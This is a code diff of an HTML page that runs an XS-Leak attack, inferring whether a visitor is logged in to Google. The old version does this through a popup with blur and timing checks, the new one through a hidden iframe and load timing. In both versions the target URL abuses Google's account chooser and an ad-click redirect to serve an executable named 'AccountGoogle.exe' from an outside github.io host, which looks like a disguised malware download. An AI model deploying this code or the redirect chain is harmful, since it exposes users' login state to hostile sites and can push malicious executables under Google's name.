@@ -1,57 +1,56 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>XS-Leak Download Detection</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>XSLeak - Google Login Status Detection</title>
 </head>
 <body>
-  <h1>Check Google Login State via Download Trigger</h1>
-  <button onclick="startCheck()">Start XS-Leak</button>
 
-  <p id="status">Waiting...</p>
+<h1>Google Login Detection</h1>
+<button id="detect-btn">Check if user is logged in to Google</button>
+<p id="result"></p>
 
-  <script>
-    let popup;
-    let blurDetected = false;
+<script>
+  const detectBtn = document.getElementById('detect-btn');
+  const result = document.getElementById('result');
 
-    function startCheck() {
-      document.getElementById('status').innerText = "Checking... Click popup if required";
+  detectBtn.addEventListener('click', () => {
+    result.textContent = 'Checking...';
 
-      const googlePopupURL = "https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe%3F";
+    const start = performance.now();
 
-      // Open popup targeting the Google account chooser + file download
-      popup = window.open(
-        googlePopupURL,
-        "GoogleLoginPopup",
-        "width=500,height=600"
-      );
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe%3F%2Fhome&ddm=1&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0';
 
-      // Listen for blur event on attacker window (user may be interacting with download bar)
-      window.onblur = () => {
-        blurDetected = true;
-        console.log("Blur detected! Possible download triggered.");
-      };
+    document.body.appendChild(iframe);
 
-      // Monitor popup close and infer behavior
-      const startTime = performance.now();
-      const popupMonitor = setInterval(() => {
-        if (popup.closed) {
-          clearInterval(popupMonitor);
-          const endTime = performance.now();
-          const elapsed = endTime - startTime;
+    iframe.onload = () => {
+      const end = performance.now();
+      const loadTime = end - start;
 
-          let message = "❌ User NOT logged in (no download or no interaction).";
+      console.log(`iframe loaded in ${loadTime}ms`);
 
-          if (blurDetected || elapsed > 2000) {
-            message = "✅ User likely LOGGED IN → Download triggered (blur detected or long wait).";
-          }
+      // Threshold: diatur sesuai pengujian real
+      if (loadTime < 500) {
+        result.textContent = '✅ User is likely logged in to Google.';
+      } else {
+        result.textContent = '❌ User is NOT logged in to Google.';
+      }
 
-          document.getElementById('status').innerText = message;
+      document.body.removeChild(iframe);
+    };
 
-          // Reset
-          window.onblur = null;
-        }
-      }, 500);
-    }
-  </script>
+    // Safety timeout kalau iframe ga load sama sekali
+    setTimeout(() => {
+      if (document.body.contains(iframe)) {
+        result.textContent = '❓ Unable to detect (timeout).';
+        document.body.removeChild(iframe);
+      }
+    }, 3000);
+  });
+</script>
+
 </body>
 </html>
